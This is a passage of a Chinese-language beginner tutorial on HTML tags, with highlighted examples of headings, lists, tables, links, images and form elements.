red&quot;</span>&gt;</span>HTML入门<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- src属性：定义要展示的图片路径.alt属性：如果图片展示不出来要显示的文件内容 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;图片资源\nailong.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;奶龙&quot;</span><span class="hljs-attr">width</span>=<span class="hljs-string">&quot;300&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;300&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="常用的HTML标签"><a href="#常用的HTML标签" class="headerlink" title="常用的HTML标签"></a>常用的HTML标签</h2><h3 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h3><p>标题标签：通过h1~h6来定义的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>~<span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h6</span>&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="段落、换行、水平线标签"><a href="#段落、换行、水平线标签" class="headerlink" title="段落、换行、水平线标签"></a>段落、换行、水平线标签</h3><p>段落标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> 一对<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>标签就是一个自然段，两对就是两个自然段会自动换行<br>常用属性：<br>align 对齐方式：<br>left 左对齐<br>right 右对齐<br>center 居中对齐<br>justify 两端对齐<br>例如：<br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;left&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <br>左对齐段落<br></code></pre></td></tr></table></figure><p>换行标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> 一个换行标签换一行<br></code></pre></td></tr></table></figure><p>水平线标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hr</span>&gt;</span> 效果为在页面中添加一条水平线<br>常用属性：<br>color：设置水平线颜色；<br>    width：设置水平线长度；<br>    size：设置水平线高度；<br>    align：设置水平线对齐方式(默认居中)，可取值 left 或 right。<br>例如：<br><span class="hljs-tag">&lt;<span class="hljs-name">hr</span> <span class="hljs-attr">color</span>=<span class="hljs-string">&quot;red&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hr</span>&gt;</span><br>红色水平线<br></code></pre></td></tr></table></figure><h3 id="文本标签"><a href="#文本标签" class="headerlink" title="文本标签"></a>文本标签</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>字体加粗 <br><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span>定义加重语气 和加粗没区别<br><span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>斜体  <br><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>定义着重字体 和斜体没区别<br><span class="hljs-tag">&lt;<span class="hljs-name">u</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">u</span>&gt;</span>下划线<br><span class="hljs-tag">&lt;<span class="hljs-name">s</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">s</span>&gt;</span>删除线 <br><span class="hljs-tag">&lt;<span class="hljs-name">del</span>&gt;</span>...&lt;\del&gt;删除线  和删除线无区别<br><span class="hljs-tag">&lt;<span class="hljs-name">sub</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">sub</span>&gt;</span>下标例如：x<span class="hljs-tag">&lt;<span class="hljs-name">sub</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">sub</span>&gt;</span>得到x₂<br><span class="hljs-tag">&lt;<span class="hljs-name">sup</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">sup</span>&gt;</span>上标例如：x<span class="hljs-tag">&lt;<span class="hljs-name">sup</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">sup</span>&gt;</span>得到x²<br><br><span class="hljs-tag">&lt;<span class="hljs-name">font</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span>字体标签<br>常用属性： <br>color颜色<br>face字体<br>size字号<br>例如：<span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">color</span>=<span class="hljs-string">&quot;red&quot;</span> <span class="hljs-attr">face</span>=<span class="hljs-string">&quot;黑体&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;7&quot;</span>&gt;</span>字体标签<span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span><br>网页上显示字体标签，并修改字体为宋体，颜色为红色，字号为7<br></code></pre></td></tr></table></figure><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>无序列表：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xquery">无序列表标签:<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>无序列表元素1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>无序列表元素2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>无序列表元素3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>常用属性：<br>type=<span class="hljs-string">&quot;属性值&quot;</span> 列表的序号<br>属性值：<br>disc实心原点(默认)<br>square实心方点<br>circle空心圆<br><br>列表之间是可以嵌套的<br>li里面什么都能放，甚至可以再放一个ul<br>例如：<br> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">            </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  <br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;circle&quot;</span>&gt;</span></span><br><span class="language-xml">  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  元素前有空心圆图标<br></code></pre></td></tr></table></figure><p>有序列表：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xquery">有序列表标签：<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>有序列表元素1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>有序列表元素2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>有序列表元素3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span></span><br>常用属性：<br>type=<span class="hljs-string">&quot;属性值&quot;</span>列表的序号<br>属性值：<br><span class="hljs-number">1</span>阿拉伯数字(默认)<br>a小写字母<br>    A大写字母<br>    i小写罗马字母<br>    I大写罗马字母 <br>例如：<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;a&quot;</span>&#x27;&gt;</span></span><br><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span></span><br>有序列表从a开始编号<br></code></pre></td></tr></table></figure><h3 id="div和span标签"><a href="#div和span标签" class="headerlink" title="div和span标签"></a>div和span标签</h3><p>div标签：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span>&gt;...&lt;/<span class="hljs-keyword">div</span>&gt;<br>&lt;<span class="hljs-keyword">div</span>&gt; 是一个块元素<br>&lt;<span class="hljs-keyword">div</span>&gt; 元素在语义上不表示任何特定类型的内容<br><span class="hljs-keyword">div</span> 可以将内容分组，从而可以使用 <span class="hljs-built_in">class</span> 或是 <span class="hljs-built_in">id</span> 属性方便的定义内容的格式，<br>也可以在一段文档中划分标记出使用另一种语言书写的内容（使用 lang 属性）<br></code></pre></td></tr></table></figure><p>span标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> 则是行内元素<br>可以用来编组元素以达到某种样式意图（通过使用类或者 id 属性）<br></code></pre></td></tr></table></figure><p>总结：</p><ul><li>div 标签，是用来布局的，但是现在<strong>一行只能放一个 div</strong>；</li><li>div 的开始标签和结束标签都不能省略；</li><li>span 标签，也是用来布局的，一行上可以放好多个 span；</li><li>span 的开始标签和结束标签都不能省略；</li></ul><h3 id="img图片标签"><a href="#img图片标签" class="headerlink" title="img图片标签"></a>img图片标签</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&lt;img&gt;<br>常用属性：<br>src设置图片路径<br><span class="hljs-built_in">title</span>当鼠标停在图片上的文字<br><span class="hljs-built_in">width</span>设置图片宽度<br><span class="hljs-built_in">height</span>设置图片高度<br><span class="hljs-built_in">border</span>设置图片边框大小<br>alt设置当前指定路径找不到图片时，用来代替显示的文本内容<br>align对齐方式<br>例如：<br>&lt;img src=<span class="hljs-string">&quot;./奶龙.png&quot;</span> <span class="hljs-built_in">width</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-built_in">height</span>=<span class="hljs-string">&quot;150&quot;</span> alt=<span class="hljs-string">&quot;找不到图片&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="a超链接标签"><a href="#a超链接标签" class="headerlink" title="a超链接标签"></a>a超链接标签</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&lt;<span class="hljs-keyword">a</span>&gt;&lt;/<span class="hljs-keyword">a</span>&gt;用于从一个页面链接到另外一个页面<br>常用属性：<br>href页面或者文件地址，如果设置为<span class="hljs-comment">#则不会跳转到其他页面</span><br>target规定在何处打开链接文档<br>值        描述<br><span class="hljs-title">_blank</span>在新窗口打开被链接的页面<br><span class="hljs-title">_self</span>默认设置，在当前的页面/框架打开被链接的页面<br><span class="hljs-title">_parent</span>在父框架集中打开被链接的页面<br><span class="hljs-title">_top</span>在整个窗口中打开被链接的页面<br>framename在指定框架中打开被链接的页面<br>例如：<br>&lt;<span class="hljs-keyword">a</span> href=<span class="hljs-string">&quot;./pages/introduction.html&quot;</span> target=<span class="hljs-string">&quot;_blank&quot;</span>&gt;introduction&lt;/<span class="hljs-keyword">a</span>&gt;<br>表示新开页面打开网站<br></code></pre></td></tr></table></figure><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs css">表格标签：<br>&lt;<span class="hljs-selector-tag">table</span>&gt;&lt;/<span class="hljs-selector-tag">table</span>&gt;<br><span class="hljs-selector-tag">tr</span>表示表格中的行（每一行可以包含多个<span class="hljs-selector-tag">th</span>和<span class="hljs-selector-tag">tr</span>）<br><span class="hljs-selector-tag">td</span>表示表格中的标准单元格<br><span class="hljs-selector-tag">th</span>表示表格中的表头单元格（具有标题的效果，字体加粗，居中显示）<br><br><span class="hljs-selector-tag">table</span>常用属性：<br><span class="hljs-attribute">border</span>设置边框，属性值为像素值<br>cellspacing设置单元格边框之间的间距<br>cellpadding设置单元格与单元内容之间的间距<br><span class="hljs-attribute">width</span>设置表格宽度<br><span class="hljs-attribute">height</span>设置表格高度<br>align设置表格在网页中的水平对齐方式：<br><span class="hljs-attribute">left</span>居左<br>center居中<br><span class="hljs-attribute">right</span>居右<br><br> <span class="hljs-selector-tag">tr</span>和<span class="hljs-selector-tag">th</span> 常用属性 <br>       align 每行中文本内容的水平方向对齐方式<br>       valign 每行中文本内容的垂直方向对齐方式（<span class="hljs-attribute">top</span> <span class="hljs-attribute">bottom</span> middle）<br>       bgcolor 设置行的背景颜色<br>       <br>       <br>    合并单元格：<br>    &lt;<span class="hljs-selector-tag">td</span>&gt;的colspan和rowspan分别规定单元格横跨的列数和行数<br>    纵向合并 rowspan<br>    横向合并 colspan<br></code></pre></td></tr></table></figure><p>自写表格：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>列标题1<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>列标题2<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>列标题3<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 21<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 22<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 23<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 31<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 32<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 33<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><p>效果图：</p><p><img src="/../image/%E8%A1%A8%E6%A0%BC%E4%BE%8B%E5%AD%90.png"></p><h3 id="form表单标签"><a href="#form表单标签" class="headerlink" title="form表单标签"></a>form表单标签</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&lt;form&gt;&lt;/form&gt;<br>所有标签都有的属性：<br>       id属性   用来标识元素的唯一性<br>       name属性 提交数据时的参数名<br>       style属性 设置元素的行内样式<br>       class属性 设置元素的样式名<br>       <br>必有属性：<br>action指定表单提交的地址，一般为服务器接口地址<br>method指定表单提交的方式，一般为<span class="hljs-built_in">get</span>或<span class="hljs-built_in">post</span><br><span class="hljs-built_in">get</span>提交 GET<br>        <span class="hljs-built_in">post</span>提交 POST<br>    target 提交数据时打开窗口的方式<br>    <span class="hljs-title">_self</span> 当前窗口<br>        <span class="hljs-title">_blank</span> 空白窗口<br>        <br>    <span class="hljs-built_in">get</span>请求和<span class="hljs-built_in">post</span>请求的区别：<br>    <span class="hljs-number">1.</span><span class="hljs-built_in">get</span>请求时参数会跟在浏览器地址后面，而<span class="hljs-built_in">post</span>请求不会<br>        <span class="hljs-number">2.</span><span class="hljs-built_in">get</span>请求相当于<span class="hljs-built_in">post</span>而言，不那么安全<br>        <span class="hljs-number">3.</span><span class="hljs-built_in">get</span>请求传递的数据长度是有限的，而<span class="hljs-built_in">post</span>请求基本没有（长度与服务器有关）<br>        <span class="hljs-number">4.</span><span class="hljs-built_in">get</span>请求比<span class="hljs-built_in">post</span>快（<span class="hljs-number">2</span>倍）<br>        <span class="hljs-number">5.</span><span class="hljs-built_in">get</span>请求有缓存，而<span class="hljs-built_in">post</span>无<br>        <br>        form是块级元素<br>        表单提交时，必须设置表单元素的name属性值，否则无法获取数据<br>        表单需要结合表单元素一起使用<br></code></pre></td></tr></table></figure><h3 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;&quot;&gt;<br><span class="hljs-keyword">type</span>属性：<br>    <span class="hljs-type">text</span>文本输入框<br><span class="hljs-keyword">password</span>密码输入框<br>checkbox复选框<br>radio单选框，如果需要单选，要设置<span class="hljs-type">name</span>属性<br>submit提交按钮，默认有一个“提交”的按钮<br><span class="hljs-keyword">reset</span>重置按钮，默认有一个“重置”的按钮<br>button按钮，默认只有一个方格，需要设置<span class="hljs-keyword">value</span>显示按钮的值<br>color颜色选择框<br>file上传文件按钮，如果需要上传多个文件，需要设置multiple<br>number数字输入框，只能输入数字<br><span class="hljs-type">date</span>日期选择框<br><span class="hljs-type">time</span>时间选择框<br><br>常用属性：<br><span class="hljs-keyword">value</span>    元素的值<br>readonly  只读状态<br>maxlength  最多输入的长度<br>disabled   禁用标签<br>checked单选框、复选框中表示默认选中<br>disabled表示禁用，不会被选择。代码如下：<br><br>如果要提交数据必须设置<span class="hljs-type">name</span>属性<br></code></pre></td></tr></table></figure><h3 id="textarea文本框标签"><a href="#textarea文本框标签" class="headerlink" title="textarea文本框标签"></a>textarea文本框标签</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br>常用属性：<br>cols规定文本区域内可见的列数<br>rows规定文本区域内可见的行数<br>value定义文本区域的内容<br>disabled设置为disabled将禁用文本区域<br>maxlength限制用户输入的最大字符数<br>placeholder规定一个简短的提示，描述文本区域期望的输入值<br>required设置为required会在提交表单时验证字段是否已填写‌<br></code></pre></td></tr></table></figure><h3 id="lable标签"><a href="#lable标签" class="headerlink" title="lable标签"></a>lable标签</h3><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">lable</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">lable</span>&gt;</span></span>标签可以 直接包含 表单 和 相关文字信息 , 点击 label 标签的范围 , 就可以触发表单的操作<br>常用属性：<br><span class="hljs-keyword">for</span>该属性值应该与相关控件<span class="hljs-built_in">的id</span>属性值相同<br>当用户点击<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>内的任何部分时，浏览器会自动将焦点转移到与之相关的表单控件上</span><br><span class="language-xml">例如：   </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span>用户名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span> </span><br><span class="language-xml">当点击用户名时会自动转移到输入文本框中</span><br></code></pre></td></tr></table></figure><h3 id="下拉框标签"><a href="#下拉框标签" 